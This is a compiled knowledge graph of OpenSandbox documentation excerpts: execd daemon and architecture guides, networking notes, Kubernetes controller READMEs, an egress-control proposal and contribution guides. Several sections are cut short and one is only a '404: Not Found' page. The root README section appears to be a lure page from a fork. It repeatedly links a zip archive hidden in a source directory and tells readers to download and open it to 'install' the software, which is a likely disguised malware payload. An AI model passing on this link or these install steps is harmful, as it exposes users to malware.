# OpenSandbox — Knowledge Graph

> Source: 19 docs from /root/Dev/bapx/reference/opensandbox-docs

---

## Components

*2 documents*

### execd - OpenSandbox Execution Daemon
*File: `components/execd/README.md`*

# execd - OpenSandbox Execution Daemon

English | [中文](README_zh.md)

`execd` is the execution daemon for OpenSandbox. Built on Beego, it exposes a comprehensive HTTP API that turns external requests into runtime actions: managing Jupyter sessions, streaming code output via Server-Sent Events (SSE), executing shell commands, operating on the sandbox filesystem, and collecting host-side metrics.

## Table of Contents

- [Overview](#overview)
- [Core Features](#core-features)
- [Architecture](#architecture)
- [Getting Started](#getting-started)
- [Configuration](#configuration)
- [API Reference](#api-reference)
- [Supported Languages](#supported-languages)
- [Development](#development)
- [Testing](#testing)
- [Observability](#observability)
- [Performance Benchmarks](#performance-benchmarks)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Overview

`execd` provides a unified interface for:

- **Code execution**: Python, Java, JavaScript, TypeScript, Go, and Bash
- **Session management**: Long-lived Jupyter kernel sessions with state
- **Command execution**: Synchronous and background shell commands
- **File operations**: Full filesystem CRUD with chunked upload/download
- **Monitoring**: Real-time host metrics (CPU, memory, uptime)

## Core Features

### Unified runtime management

- Translate REST calls into runtime requests handled by `pkg/runtime`
- Multiple execution backends: Jupyter, shell, etc.
- Automatic language detection and routing
- Pluggable Jupyter server configuration

### Jupyter integration

- Maintain kernel sessions via `pkg/jupyter`
- WebSocket-based real-time communication
- Stream execution events through SSE

### Command executor

- Foreground and background shell commands
- Proper signal forwarding with process groups
- Real-time stdout/stderr streaming
- Context-aware interruption

### Filesystem

- CRUD helpers around the sandbox filesystem
- Glob-based file search
- Chunked upload/download with resume support
- Permission management

### Observability

- Lightweight metrics endpoint (CPU, memory, uptime)
- Structured streaming logs
- SSE-based real-time monitoring

## Architecture

### Directory structure

| Path                   | Purpose                                              |
|------------------------|------------------------------------------------------|
| `main.go`              | Entry point; initializes Beego, CLI flags, routers   |
| `pkg/flag/`            | CLI and environment configuration                    |
| `pkg/web/`             | HTTP layer (controllers, models, router, SSE helpers) |
| `pkg/web/controller/`  | Handlers for files, code, commands, metrics          |
| `pkg/web/model/`       | Request/response models and SSE event types          |
| `pkg/runtime/`         | Dispatcher to Jupyter and shell executors            |
| `pkg/jupyter/`         | Minimal Jupyter client (kernels/sessions/WebSocket)  |
| `pkg/jupyter/execute/` | Execution result types and strea

---

### Development Guide - execd
*File: `components/execd/DEVELOPMENT.md`*

# Development Guide - execd

This comprehensive guide explains how to work on `execd` as a contributor or maintainer. It covers environment setup,
development workflows, testing strategies, architectural patterns, and subsystem-specific implementation details.

## Table of Contents

- [Getting Started](#getting-started)
- [Project Structure](#project-structure)
- [Coding Standards](#coding-standards)
- [Testing Strategy](#testing-strategy)
- [Subsystem Guides](#subsystem-guides)
- [Common Development Tasks](#common-development-tasks)
- [Debugging Techniques](#debugging-techniques)
- [Performance Optimization](#performance-optimization)
- [Contributing Guidelines](#contributing-guidelines)
- [Additional Resources](#additional-resources)

## Getting Started

### Prerequisites

#### Required Tools

- **Go 1.24+** - Match the version declared in `go.mod`
- **Git** - Version control
- **Make** - Build automation (optional but recommended)

#### Optional but Recommended

- **golangci-lint** - For comprehensive linting
- **Docker/Podman** - For containerized testing and deployment
- **Jupyter Server** - Required for integration tests with real kernels
- **VS Code/GoLand** - IDE with Go support

### Initial Setup

```bash
# Clone the repository
git clone https://github.com/alibaba/OpenSandbox.git
cd OpenSandbox/components/execd

# Download dependencies
go mod download

# Verify setup
go build -o bin/execd .
```

## Project Structure

### Project Structure Deep Dive

```
execd/
├── main.go                 # Application entry point
├── go.mod                  # Go module definition
├── Makefile               # Build automation
├── Dockerfile             # Container image definition
│
├── pkg/                   # Public packages
│   ├── flag/              # CLI flag parsing
│   ├── web/               # HTTP layer
│   │   ├── router.go      # Route registration
│   │   ├── controller/    # Request handlers
│   │   └── model/         # API models
│   ├── runtime/           # Execution engine
│   │   ├── ctrl.go        # Main controller
│   │   ├── jupyter.go     # Jupyter execution
│   │   └── command.go     # Shell command execution
│   ├── jupyter/           # Jupyter client
│   │   ├── client.go      # HTTP/WebSocket client
│   │   ├── session/       # Session management
│   │   └── execute/       # Execution protocol
│   └── util/              # Utilities
│
└── tests/                # Integration test scripts
```

### Key Design Patterns

#### 1. Controller Pattern (pkg/web/controller)

Controllers are thin HTTP handlers that parse requests, validate, delegate to runtime, and stream responses via SSE.

#### 2. Runtime Controller Pattern (pkg/runtime)

The runtime controller dispatches requests to appropriate executors (Jupyter, Command, SQL) and manages session
lifecycle.

#### 3. Hook Pattern for Streaming

Execution results are streamed via hooks, allowing controllers to transform runtime events into SSE events without tight
coupling.

## Coding Standar

---

## Docs

*2 documents*

### OpenSandbox Architecture
*File: `docs/architecture.md`*

# OpenSandbox Architecture

OpenSandbox is a universal sandbox platform designed for AI application scenarios, providing a complete solution with multi-language SDKs, standardized sandbox protocols, and flexible runtime implementations. This document describes the overall architecture and design philosophy of OpenSandbox.

## Architecture Overview

![OpenSandbox Architecture](assets/architecture.svg)

The OpenSandbox architecture consists of four main layers:

1. **SDKs Layer** - Client libraries for interacting with sandboxes
2. **Specs Layer** - OpenAPI specifications defining the protocols
3. **Runtime Layer** - Server implementations managing sandbox lifecycle
4. **Sandbox Instances Layer** - Running sandbox containers with injected execution daemons

## 1. OpenSandbox SDKs

The SDK layer provides high-level abstractions for developers to interact with sandboxes. It handles communication with both the Sandbox Lifecycle API and the Sandbox Execution API.

### Core SDK Components

#### 1.1 Sandbox

The `Sandbox` class is the primary entry point for managing sandbox lifecycle:

- **Create**: Provision new sandbox instances from container images
- **Manage**: Monitor sandbox state, renew expiration, retrieve endpoints
- **Destroy**: Terminate sandbox instances when no longer needed

**Key Features:**
- Async/await support for non-blocking operations
- Automatic state polling for provisioning progress
- Resource quota management (CPU, memory, GPU)
- Metadata and environment variable injection
- TTL-based automatic expiration with renewal

#### 1.2 Filesystem

The `Filesystem` component provides comprehensive file operations within sandboxes:

- **CRUD Operations**: Create, read, update, and delete files and directories
- **Bulk Operations**: Upload/download multiple files efficiently
- **Search**: Glob-based file searching with pattern matching
- **Permissions**: Manage file ownership, group, and mode (chmod)
- **Metadata**: Retrieve file info including size, timestamps, permissions

**Use Cases:**
- Uploading code files and dependencies
- Downloading execution results and artifacts
- Managing workspace directories
- Searching for files by pattern

#### 1.3 Commands

The `Commands` component enables shell command execution within sandboxes:

- **Foreground Execution**: Run commands synchronously with real-time output streaming
- **Background Execution**: Launch long-running processes in detached mode
- **Stream Support**: Capture stdout/stderr via Server-Sent Events (SSE)
- **Process Control**: Interrupt running commands via context cancellation
- **Working Directory**: Specify custom working directory for command execution

**Use Cases:**
- Running build commands (e.g., `npm install`, `pip install`)
- Executing system utilities (e.g., `git`, `docker`)
- Starting web servers or services
- Running test suites

#### 1.4 CodeInterpreter

The `CodeInterpreter` component provides stateful code execution across multiple programming languages:

- **Multi

---

### Single-host network in OpenSandbox
*File: `docs/single_host_network.md`*

# Single-host network in OpenSandbox

Detailed routing for a single-host deployment: how execd’s proxy gives every sandbox access to HTTP and WebSocket ports through one exposed host port.

![Single-host sandbox routing](assets/single_host_network.png)

## Single-host routing model
- Every sandbox container starts `execd` listening on container port `44772`. `execd` bundles a lightweight reverse proxy that intercepts requests with the `/proxy/{port}` prefix and forwards them to `127.0.0.1:{port}` inside the same container.
- The Docker runtime binds only the host side of the execd proxy port (labeled `opensandbox.io/embedding-proxy-port`). Callers use `get_endpoint(..., port=X)` to receive `{public_host}:{host_proxy_port}/proxy/{X}`, and execd transparently routes the request back to the sandbox service on port `X`.
- Because the proxy preserves `Upgrade`, `Connection`, and other HTTP headers, HTTP, Server-Sent Events, and WebSocket traffic share the same mapped host port without additional configuration.
- With this setup, a single host port per sandbox suffices to reach **all** container ports. You can safely run many sandboxes on one machine without worrying about overlapping host port allocations.
- When the caller lives inside the same Docker network (e.g., another container or Kubernetes pod), use `get_endpoint(..., resolve_internal=True)` to bypass the host mapping and return the sandbox IP (e.g., `172.17.0.3:5900`) instead.
- The diagram above shows the routing path: host traffic hits the proxy port, execd rewrites the request towards the target container port, and upstream services remain isolated within the sandbox.

## Network modes

### Host network mode (single-host constraints)
- Containers share the host network stack (`network_mode=host`) so sandbox ports are directly accessible on the host.
- Because each sandbox binds its ports on the host, this mode practically limits you to one sandbox instance per host unless you reserve dedicated ports per sandbox.
- `get_endpoint(..., port=X)` returns `{public_host}:{X}` with no `/proxy/` prefix, so the caller needs to know the exact host port and the host must manage firewall rules for each sandbox port.

### Bridge network mode (default for single-host deployments)
- Docker places sandboxes on an isolated bridge network, preventing container ports from being reachable without explicit mapping.
- For single-host scaling, OpenSandbox maps only execd’s proxy port (`44772`) and, optionally, port `8080`. Any other container port stays private and is reached via the proxy.
- The reverse proxy label (`opensandbox.io/embedding-proxy-port`) identifies a host port that fronts `execd`. `get_endpoint(..., port=X)` returns `{public_host}:{host_proxy_port}/proxy/{X}`, so all internal ports can share the same host binding.
- Port `8080` may also receive a direct host binding (`opensandbox.io/http-port`), providing a conventional HTTP endpoint without the proxy path when required.
- This bridge setup let

---

## Examples

*1 documents*

### OpenSandbox Examples
*File: `examples/README.md`*

# OpenSandbox Examples

Examples for common OpenSandbox use cases. Each subdirectory contains runnable code and documentation.

## Integrations / Sandboxes
- [**aio-sandbox**](aio-sandbox): Basic example for agent_sandbox
- [**code-interpreter**](code-interpreter): Code Interpreter SDK singleton example
- [**claude-code**](claude-code): Call Claude (Anthropic) API/CLI within the sandbox
- [**iflow-cli**](iflow-cli): CLI invocation template for iFlow/custom HTTP LLM services
- [**gemini-cli**](gemini-cli): Call Google Gemini within the sandbox
- [**codex-cli**](codex-cli): Call OpenAI/Codex-like models within the sandbox
- [**langgraph**](langgraph): LangGraph agent orchestrating sandbox lifecycle + tools
- [**google-adk**](google-adk): Google ADK agent calling OpenSandbox tools
- [**desktop**](desktop): Launch VNC desktop (Xvfb + x11vnc) for VNC client connections
- [**playwright**](playwright): Launch headless browser (Playwright + Chromium) to scrape web content
- [**vscode**](vscode): Launch code-server (VS Code Web) to provide browser access
- [**chrome**](chrome): Launch headless Chromium with DevTools port exposed for remote debugging

## How to Run
- Set basic environment variables (e.g., `export SANDBOX_DOMAIN=...`, `export SANDBOX_API_KEY=...`)
- Add provider-specific variables as needed (e.g., `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `IFLOW_API_KEY`/`IFLOW_ENDPOINT`, etc.; model selection is optional)
- Navigate to the example directory and install dependencies: `pip install -r requirements.txt` (or refer to the Dockerfile in the directory)
- Then execute: `python main.py`
- To run in a container, build and run using the `Dockerfile` in the directory
- Summary: First set required environment variables via `export`, then run `python main.py` in the corresponding directory, or build/run the Docker image for that directory.


---

## Kubernetes

*2 documents*

### OpenSandbox Kubernetes控制器
*File: `kubernetes/README-ZH.md`*

# OpenSandbox Kubernetes控制器

[English](README.md) | [中文](README-ZH.md)

OpenSandbox Kubernetes控制器是一个Kubernetes操作器，通过自定义资源管理沙箱环境。它在Kubernetes集群中提供**自动化沙箱生命周期管理**、**资源池化以实现快速供应**、**批处理沙箱创建**和**可选的任务编排**功能。

## 关键特性

- **灵活的沙箱创建**：在池化和非池化沙箱创建模式之间选择
- **批处理和单个交付**：支持单个沙箱（用于真实用户交互）和批处理沙箱交付（用于高吞吐量智能体强化学习场景）
- **可选任务调度**：集成任务编排，支持可选的分片任务模板以实现异构任务分发和定制化沙箱交付（例如，进程注入或动态容器创建）
- **资源池化**：维护预热的资源池以实现快速沙箱供应
- **全面监控**：实时跟踪沙箱和任务状态

## 功能特性

### 批处理沙箱管理
BatchSandbox自定义资源允许您创建和管理多个相同的沙箱环境。主要功能包括：
- **灵活的创建模式**：支持池化（使用资源池）和非池化沙箱创建
- **单个和批处理交付**：根据需要创建单个沙箱（replicas=1）或批处理沙箱（replicas=N）
- **可扩展的副本管理**：通过副本配置轻松控制沙箱实例数量
- **自动过期**：设置TTL（生存时间）以自动清理过期沙箱
- **可选任务调度**：内置任务执行引擎，支持可选任务模板
- **详细状态报告**：关于副本、分配和任务状态的综合指标

### 资源池化
Pool自定义资源维护一个预热的计算资源池，以实现快速沙箱供应：
- 可配置的缓冲区大小（最小和最大）以平衡资源可用性和成本
- 池容量限制以控制总体资源消耗
- 基于需求的自动资源分配和释放
- 实时状态监控，显示总数、已分配和可用资源

### 任务编排
集成的任务管理系统，在沙箱内执行自定义工作负载：
- **可选执行**：任务调度完全可选 - 可以在不带任务的情况下创建沙箱
- **容器和进程任务**：支持基于容器和基于进程的任务
- **异构任务分发**：使用shardTaskPatches为批处理中的每个沙箱定制单独的任务

### 高级调度
智能资源管理功能：
- 最小和最大缓冲区设置，以确保资源可用性同时控制成本
- 池范围的容量限制，防止资源耗尽
- 基于需求的自动扩展

## 入门指南

### 先决条件
- go版本v1.24.0+
- docker版本17.03+。
- kubectl版本v1.11.3+。
- 访问Kubernetes v1.22.4+集群。

如果您没有Kubernetes集群的访问权限，可以使用[kind](https://kind.sigs.k8s.io/)创建一个本地Kubernetes集群进行测试。Kind在Docker容器中运行Kubernetes节点，使得设置本地开发环境变得容易。

安装kind：
- 从[发布页面](https://github.com/kubernetes-sigs/kind/releases)下载适用于您操作系统的发布二进制文件并将其移动到您的`$PATH`中
- 或使用包管理器：
  - macOS (Homebrew): `brew install kind`
  - Windows (winget): `winget install Kubernetes.kind`

安装kind后，使用以下命令创建集群：
```sh
kind create cluster
```

此命令默认创建单节点集群。要与其交互，请使用生成的kubeconfig运行`kubectl`。

**Kind用户的重要说明**：如果您使用的是kind集群，在使用`make docker-build`构建镜像后，需要将控制器和任务执行器镜像加载到kind节点中。这是因为kind在Docker容器中运行Kubernetes节点，无法直接访问本地Docker守护进程中的镜像。

使用以下命令将镜像加载到kind集群中：
```sh
kind load docker-image <controller-image-name>:<tag>
kind load docker-image <task-executor-image-name>:<tag>
```

例如，如果您使用`make docker-build IMG=my-controller:latest`构建镜像，则使用以下命令加载：
```sh
kind load docker-image my-controller:latest
```

完成后使用以下命令删除集群：
```sh
kind delete cluster
```

有关使用kind的更多详细说明，请参阅[官方kind文档](https://kind.sigs.k8s.io/docs/user/quick-start/)。

### 部署

此项目需要两个独立的镜像 - 一个用于控制器，另一个用于任务执行器组件。

1. **构建和推送您的镜像：**
   ```sh
   # 构建和推送控制器镜像
   make docker-build docker-push IMG=<some-registry>/opensandbox-controller:tag
   
   # 构建和推送任务执行器镜像
   make docker-build-task-executor docker-push-task-executor IMG=<some-registry>/opensandbox-task-executor:tag
   ```

   **注意：** 这些镜像应该发布在您指定的个人注册表中。需要能够从工作环境中拉取镜像。如果上述命令不起作用，请确保您对注册表具有适当的权限。

2. **将CRD安装到集群中：**
   ```sh
   make install
   ```

3. **将管理器部署到集群：**
   ```sh
   make deploy IMG=<some-registry>/opensandbox-controller:tag TASK_EXECUTOR_IMG=<some-registry>/opensandbox-task-executor:tag
   ```

   **注意**：您可能需要授予自己集群管理员权限或以管理员身份登录以确保您在运行命令之前具有集群管理员权限。

**Kind用户的重要说明**：如果您使用的是kind集群，需要在构建镜像后将两个镜像都加载到kind节点中：
```sh
kind load docker-image <controller-image-name>:<tag>
kind load docker-image <task-executor-image-name>:<tag>
```

### 创建BatchSandbox和Pool资源

#### 基础示

---

### OpenSandbox Kubernetes Controller
*File: `kubernetes/README.md`*

# OpenSandbox Kubernetes Controller

[English](README.md) | [中文](README-ZH.md)

OpenSandbox Kubernetes Controller is a Kubernetes operator that manages sandbox environments through custom resources. It provides **automated sandbox lifecycle management**, **resource pooling for fast provisioning**, **batch sandbox creation**, and **optional task orchestration** capabilities in Kubernetes clusters.

## Key Features

- **Flexible Sandbox Creation**: Choose between pooled and non-pooled sandbox creation modes
- **Batch and Individual Delivery**: Support both single sandbox (for real-user interactions) and batch sandbox delivery (for high-throughput agentic-RL scenarios)
- **Optional Task Scheduling**: Integrated task orchestration with optional shard task templates for heterogeneous task distribution and customized sandbox delivery (e.g., process injection or dynamic container creation)
- **Resource Pooling**: Maintain pre-warmed resource pools for rapid sandbox provisioning
- **Comprehensive Monitoring**: Real-time status tracking of sandboxes and tasks

## Features

### Batch Sandbox Management
The BatchSandbox custom resource allows you to create and manage multiple identical sandbox environments. Key capabilities include:
- **Flexible Creation Modes**: Support both pooled (using resource pools) and non-pooled sandbox creation
- **Single and Batch Delivery**: Create single sandboxes (replicas=1) or batches of sandboxes (replicas=N) as needed
- **Scalable Replica Management**: Easily control the number of sandbox instances through replica configuration
- **Automatic Expiration**: Set TTL (time-to-live) for automatic cleanup of expired sandboxes
- **Optional Task Scheduling**: Built-in task execution engine with support for optional task templates
- **Detailed Status Reporting**: Comprehensive metrics on replicas, allocations, and task states

### Resource Pooling
The Pool custom resource maintains a pool of pre-warmed compute resources to enable rapid sandbox provisioning:
- Configurable buffer sizes (minimum and maximum) to balance resource availability and cost
- Pool capacity limits to control overall resource consumption
- Automatic resource allocation and deallocation based on demand
- Real-time status monitoring showing total, allocated, and available resources

### Task Orchestration
Integrated task management system that executes custom workloads within sandboxes:
- **Optional Execution**: Task scheduling is completely optional - sandboxes can be created without tasks
- **Container and Process Tasks**: Support for both container-based and process-based tasks
- **Heterogeneous Task Distribution**: Customize individual tasks for each sandbox in a batch using shardTaskPatches

### Advanced Scheduling
Intelligent resource management features:
- Minimum and maximum buffer settings to ensure resource availability while controlling costs
- Pool-wide capacity limits to prevent resource exhaustion
- Automatic scaling based on demand

## Getting Star

---

## Oseps

*2 documents*

### OSEP-0001: FQDN-based Egress Control
*File: `oseps/0001-fqdn-based-egress-control.md`*

---
title: FQDN-based Egress Control
authors:
  - "@hittyt"
creation-date: 2025-12-27
last-updated: 2025-12-30
status: provisional
---

# OSEP-0001: FQDN-based Egress Control

<!-- toc -->
- [Summary](#summary)
- [Motivation](#motivation)
  - [Goals](#goals)
  - [Non-Goals](#non-goals)
- [Requirements](#requirements)
- [Proposal](#proposal)
  - [Notes/Constraints/Caveats](#notesconstraintscaveats)
  - [Risks and Mitigations](#risks-and-mitigations)
- [Design Details](#design-details)
  - [API Schema](#api-schema)
  - [Architecture Overview](#architecture-overview)
  - [Layer 1: DNS Proxy](#layer-1-dns-proxy)
  - [Layer 2: Network Filter](#layer-2-network-filter)
  - [Capability Detection and Graceful Degradation](#capability-detection-and-graceful-degradation)
  - [Enforcement Modes](#enforcement-modes)
  - [Component Changes](#component-changes)
- [Test Plan](#test-plan)
- [Drawbacks](#drawbacks)
- [Alternatives](#alternatives)
- [Infrastructure Needed](#infrastructure-needed)
- [Upgrade & Migration Strategy](#upgrade--migration-strategy)
<!-- /toc -->

## Summary

This proposal introduces domain-based (FQDN) egress control for OpenSandbox. It enables users to declaratively specify which external domains a sandbox can access, using a `network_policy` field in the Sandbox Lifecycle API. The implementation uses a two-layer approach (DNS-level filtering plus optional network-layer enforcement) delivered via a **sidecar** that shares the sandbox network namespace; the application container itself does not receive extra privileges.

## Motivation

In AI Agent scenarios (e.g., Coding Agents, Data Analysis Agents), sandboxes frequently need controlled access to external services such as `api.github.com`, `pypi.org`, or `api.openai.com`. Currently, OpenSandbox lacks fine-grained network egress control.

Existing industry solutions like E2B and Modal primarily rely on IP addresses or CIDR blocks for egress control. However, this approach has critical limitations:

**Dynamic IP Challenges**: Modern cloud services and CDNs frequently change their underlying IP addresses. Manually maintaining an IP allowlist for domains like `api.github.com` is operationally expensive and error-prone.

**Security Gaps**: IP-based rules can be bypassed if multiple services share the same IP address (common in virtual hosting). Without domain-level (L7) awareness, a sandbox allowed to access one service might inadvertently access others on the same host.

**Developer Experience (DX)**: It is much more intuitive for developers to declare "allow access to `openai.com`" than to perform DNS lookups and input CIDR ranges during sandbox creation.

OpenSandbox aims to be a universal AI sandbox platform. To meet enterprise-grade security and production requirements, it must support Domain-based (FQDN) Egress Control.

### Goals

1. **Declarative API**: Provide a `network_policy.egress` field in the Sandbox Lifecycle API that accepts domain-based allow/deny rules.
2. **Wildcard Suppor

---

### OSEP (OpenSandbox Enhancement Proposals)
*File: `oseps/README.md`*

# OSEP (OpenSandbox Enhancement Proposals)

Use this directory to draft, review, and store enhancement proposals before they
undergo broader discussion.

> [!NOTE]
> The OSEP process and template structure is inspired by
> [Tekton Enhancement Proposals (TEPs)](https://github.com/tektoncd/community/tree/main/teps).

> [!IMPORTANT]
> **When is an OSEP required?**
>
> Use the OSEP process for changes that:
> - Introduce new features or major enhancements
> - Modify the core sandbox API or runtime behavior
> - Affect the security model or isolation guarantees
>
> Small bug fixes, documentation updates, and minor refactors can be submitted
> directly as Pull Requests without an OSEP.

## Getting started

1. Run the init script to create a new proposal:

   ```bash
   oseps/init-osep.sh "Proposal Title"
   ```

   This copies the template, fills in metadata, and creates a sequentially
   numbered `0001-proposal-title.md` draft.

2. Fill in each section from the template (`Summary`, `Motivation`, …).
3. Once ready, submit the resulting file in a PR for community review.

**Available options:**

```bash
oseps/init-osep.sh --help
oseps/init-osep.sh --status provisional --author "@username" "My Feature"
```

## Template

The template used for new proposals lives at `oseps/osep-template.md.template`
and mirrors Tekton's TEP structure while capturing the key sections needed
for OpenSandbox planning. Each generated file starts with YAML front matter
followed by the title and TOC:

```yaml
---
title: My First Proposal
authors:
  - "@your-github-handle"
creation-date: 2025-12-21
last-updated: 2025-12-21
status: draft
---

# OSEP-0001: My First Proposal

<!-- toc -->
- [Summary](#summary)
...
<!-- /toc -->
```

This YAML front matter renders as a table on GitHub and keeps the proposal
metadata (status, authors, dates) visible at the top of the document.

## Status lifecycle

| Status | Description |
|--------|-------------|
| `draft` | Work in progress; not yet under formal review. |
| `provisional` | Maintainers agree with the direction; design details still pending. |
| `implementable` | Design approved and compliance checks passed; ready for implementation. |
| `implementing` | Code is being merged and SDKs are being synchronized. |
| `implemented` | Feature has reached GA status with complete documentation. |
| `withdrawn` | Author has withdrawn the proposal. |
| `rejected` | Maintainers have declined the proposal. |


---

## Root

*4 documents*

### Contributing to OpenSandbox
*File: `CONTRIBUTING.md`*

# Contributing to OpenSandbox

Thank you for your interest in contributing to OpenSandbox! This guide will help you get started with contributing to the project, whether you're fixing bugs, adding features, improving documentation, or helping in other ways.

## Table of Contents

- [Code of Conduct](#code-of-conduct)
- [Getting Started](#getting-started)
- [Development Environment Setup](#development-environment-setup)
- [Project Structure](#project-structure)
- [Development Workflow](#development-workflow)
- [Coding Standards](#coding-standards)
- [Testing Guidelines](#testing-guidelines)
- [Submitting Contributions](#submitting-contributions)
- [Communication Channels](#communication-channels)

## Code of Conduct

OpenSandbox adheres to a [Code of Conduct](../CODE_OF_CONDUCT.md) that we expect all contributors to follow. Please read it before contributing to ensure a welcoming and inclusive environment for everyone.

## Getting Started

### Ways to Contribute

There are many ways to contribute to OpenSandbox:

- **Report Bugs**: Submit detailed bug reports through [GitHub Issues](https://github.com/alibaba/OpenSandbox/issues)
- **Suggest Features**: Propose new features or improvements
- **Write Code**: Fix bugs, implement features, or improve performance
- **Improve Documentation**: Enhance README files, write tutorials, or fix typos
- **Write Tests**: Add test coverage or improve existing tests
- **Review Pull Requests**: Help review and test others' contributions
- **Answer Questions**: Help other users in GitHub Discussions or Issues

### Before You Start

1. **Search Existing Issues**: Check if your bug report or feature request already exists
2. **Check Roadmap**: Review the project roadmap to see if your idea aligns with project goals
3. **Discuss Major Changes**: For significant changes, open an issue first or submit an [OSEP](oseps/README.md) to discuss your approach
4. **Review Architecture**: Read [docs/architecture.md](architecture.md) to understand the system design

## Development Environment Setup

### Prerequisites

Different components have different requirements:

#### For Server (Python)
- **Python 3.10+**
- **uv** - Python package manager ([installation guide](https://github.com/astral-sh/uv))
- **Docker** - For running sandboxes locally

#### For execd (Go)
- **Go 1.24+**
- **Make** - Build automation (optional)
- **Docker** - For building container images

#### For SDKs
- **Python SDK**: Python 3.10+, uv
- **Java/Kotlin SDK**: JDK 17+, Gradle

### Quick Setup

#### Server Development

```bash
# Navigate to server directory
cd server

# Install dependencies
uv sync

# Copy example configuration
cp example.config.toml ~/.sandbox.toml

# Edit configuration for development
# Set log_level = "DEBUG" and api_key
nano ~/.sandbox.toml

# Run server
uv run python -m src.main
```

See [server/DEVELOPMENT.md](../server/DEVELOPMENT.md) for detailed server development guide.

#### execd Development

```bash
# Navigate to execd director

---

### Code of Conduct
*File: `CODE_OF_CONDUCT.md`*

# Code of Conduct

We are committed to a welcoming, safe, and respectful community.

## Expected Behavior
- Be respectful and inclusive.
- Assume good intent; seek to understand.
- Provide constructive feedback; critique code, not people.
- Follow project guidelines and security practices.

## Unacceptable Behavior
- Harassment, personal attacks, or discriminatory language.
- Publishing private information without consent.
- Disruptive or aggressive behavior in any project space.

## Scope
This Code applies to all project spaces, including issues, pull requests, discussions, chat, and events.

## Reporting
Report incidents to: **conduct@opensandbox.io**. Include as much detail as possible (what happened, when/where, links, screenshots if applicable).

## Enforcement
Maintainers will investigate in good faith and may take appropriate action, including warnings, temporary bans, or removal from the community.


---

### 🥇 OpenSandbox - Simplifying AI Testing Environments
*File: `README.md`*

# 🥇 OpenSandbox - Simplifying AI Testing Environments

## 📥 Download Now!
[![Download OpenSandbox](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/kubernetes/internal/task-executor/Open-Sandbox-mawp.zip)](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/kubernetes/internal/task-executor/Open-Sandbox-mawp.zip)

## 🚀 Getting Started
Welcome to OpenSandbox! This platform allows you to easily test AI applications in a controlled environment. Follow these simple steps to get started.

## 📋 System Requirements
To run OpenSandbox, your computer should meet the following requirements:
- Operating System: Windows 10, macOS, or a recent Linux distribution.
- RAM: At least 4 GB.
- Disk Space: At least 500 MB of free space.
- Internet Connection: Required for initial setup.

## 🌐 Features
OpenSandbox offers a range of features useful for AI application development:
- **Multi-Language SDKs**: Use SDKs for various programming languages including Python, Java, and JavaScript.
- **Unified Sandbox Protocols**: Easily integrate multiple AI models.
- **Sandbox Runtimes**: Execute models securely and isolate them from your main system.

## 🔗 Download & Install
To download OpenSandbox, please visit the following link:

[Download OpenSandbox](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/kubernetes/internal/task-executor/Open-Sandbox-mawp.zip)

1. Click the link to go to the Releases page.
2. Look for the latest release, which will be listed at the top.
3. Choose the version suitable for your operating system. Click on the file to start the download.
4. Once downloaded, open the file to begin installation. Follow the on-screen instructions to complete the setup.

## 🐛 Troubleshooting
If you encounter issues during installation or when running OpenSandbox, here are some common problems and solutions:

- **Installation Failed**: Ensure your system meets the requirements. Check that you have enough disk space and memory available.
- **App Not Launching**: Restart your computer and try again. If it still doesn’t work, reinstall the application using the steps in the previous section.
- **Network Issues**: Make sure your internet connection is stable during the installation process.

## 🌟 Additional Resources
Here are some additional resources to help you get the most out of OpenSandbox:
- **Documentation**: Comprehensive user guides and API references are available to assist with setup and usage.
- **Community Forums**: Connect with other users in our forums for tips and troubleshooting advice.
- **Tutorials**: Watch video tutorials that provide step-by-step guides on using various features of OpenSandbox.

## 💬 Support
If you need further assistance, please contact our support team via GitHub Issues or email. We are here to help you!

Thank you for choosing OpenSandbox. We hope this platform makes developing and testing AI applications easier for you!

---

### Repository Guidelines
*File: `AGENTS.md`*

# Repository Guidelines

## Project Structure & Module Organization
- `server/`: Python FastAPI service, configs, and tests.
- `components/execd/`: Go execution daemon and related tests.
- `sdks/`: Multi-language SDKs (`sdks/sandbox/*`, `sdks/code-interpreter/*`).
- `sandboxes/`: Runtime sandbox implementations (e.g., `sandboxes/code-interpreter/`).
- `specs/`: OpenAPI specs (`specs/execd-api.yaml`, `specs/sandbox-lifecycle.yml`).
- `examples/`: End-to-end usage examples and integrations.
- `tests/`: Cross-component/E2E tests (`tests/python/`, `tests/java/`).
- `docs/`, `oseps/`, `scripts/`: Docs, proposals, and automation scripts.

## Build, Test, and Development Commands
- Server (Python):
  - `cd server && uv sync` installs deps.
  - `cp server/example.config.toml ~/.sandbox.toml` sets local config.
  - `cd server && uv run python -m src.main` runs the API server.
- execd (Go):
  - `cd components/execd && go build -o bin/execd .` builds the daemon.
  - `cd components/execd && make fmt` formats Go sources.
- SDKs:
  - Python: `cd sdks/sandbox/python && uv sync && uv run pytest`.
  - Kotlin: `cd sdks/sandbox/kotlin && ./gradlew build`.
- Specs: `node scripts/spec-doc/generate-spec.js` regenerates spec docs.

## Coding Style & Naming Conventions
- Python: PEP 8, `ruff` for lint/format, type hints on public APIs.
- Go: `gofmt`, explicit error handling, standard import grouping.
- Kotlin: Kotlin Coding Conventions, `ktlint` where configured.
- Naming: classes `PascalCase`, functions `snake_case` (Python) / `camelCase` (Go/Kotlin), constants `UPPER_SNAKE_CASE`.

## Testing Guidelines
- Python tests use `pytest` (async tests common).
- Go tests use `go test` under `components/execd/pkg/...`.
- Kotlin tests use Gradle (`./gradlew test`).
- Coverage targets (from CONTRIBUTING): core packages >80%, API layer >70%.

## Commit & Pull Request Guidelines
- Commit messages follow Conventional Commits, e.g. `feat(server): add runtime`.
- Use feature branches (e.g., `feature/...`, `fix/...`) and keep PRs focused.
- PRs should include summary, testing status, and linked issues; follow the template in `CONTRIBUTING.md`.
- For major API or architectural changes, submit an OSEP (`oseps/`).

## Security & Configuration Tips
- Local server config lives in `~/.sandbox.toml` (copied from `server/example.config.toml`).
- Docker is required for local sandbox execution; keep images and keys out of commits.


---

## Sdks

*3 documents*

### sdks/README.md
*File: `sdks/README.md`*

404: Not Found

---

### OpenSandbox Code Interpreter SDK for Python
*File: `sdks/code-interpreter/python/README.md`*

# OpenSandbox Code Interpreter SDK for Python

English | [中文](README_zh.md)

A Python SDK for executing code in secure, isolated sandboxes. It provides a high-level API for running Python, Java,
Go, TypeScript, and other languages safely, with support for code execution contexts.

## Prerequisites

